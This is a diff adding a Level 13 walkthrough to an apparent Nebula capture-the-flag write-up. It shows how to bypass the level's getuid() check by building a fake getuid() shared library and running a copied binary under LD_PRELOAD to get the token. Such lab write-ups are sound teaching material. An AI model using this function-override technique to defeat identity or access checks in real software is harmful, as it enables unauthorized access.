@@ -604,3 +604,82 @@ Success.
 
 ## Level 13
 
+There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.
+
+To do this level, log in as the level13 account with the password level13. Files for this level can be found in /home/flag13.
+
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <string.h>
+
+#define FAKEUID 1000
+
+int main(int argc, char **argv, char **envp)
+{
+  int c;
+  char token[256];
+
+  if(getuid() != FAKEUID) {
+      printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
+      printf("The system administrators will be notified of this violation\n");
+      exit(EXIT_FAILURE);
+  }
+
+  // snip, sorry :)
+
+  printf("your token is %s\n", token);
+  
+}
+```
+
+Log in into level13.
+
+Checking the source code, the `./flag13` executable prints a token file if and only if the `UID` of the user that run the program is 1000.
+
+The solution here is pretty freaky and fun.
+
+Let's read `man ld.so`:
+
+LD_PRELOAD: A whitespace-separated list of additional, user-specified, ELF  shared  libraries  to  be loaded  before  all  others.  This can be used to selectively override functions in other shared libraries.  For setuid/setgid ELF binaries, only libraries in the standard  search directories that are also setgid will be loaded.
+
+So if our executable is compiled with shared libraries, we could:
+1. Write a fake `getuid()` that always returns 1000;
+2. Compile it as a shared library;
+3. Use `LD_PRELOAD` to override the function with the fake one;
+
+Another important point is that the executable and the library must both be either SETUID or not.
+
+If we write this fake library, it wouldn't be SETUID, so we have to copy the `./flag13` executable in order to execute it with the fake library.
+
+Let's do everything we need to perform the attack:
+
+First thing first, the fake library:
+
+```
+level13@nebula:~$ touch getuid.c
+level13@nebula:~$ echo "int getuid(){return 1000;}" > getuid.c
+gcc -shared -fPIC -o getuid.so getuid.c
+```
+
+Now we have to copy the `./flag13` executable and run it with `LD_PRELOAD` set:
+
+```
+level13@nebula:~$ cp /home/flag13/flag13 /home/level13/flag13
+level13@nebula:~$     LD_PRELOAD=/home/level13/getuid.so /home/level13/flag13
+your token is b705702b-76a8-42b0-8844-3adabbe5ac58
+```
+
+We did it! Now we just have to run `/bin/getflag` as flag13:
+
+```
+...
+flag13@nebula:~$ getflag
+You have successfully executed getflag on a target account
+...
+```
+
+Success.
+
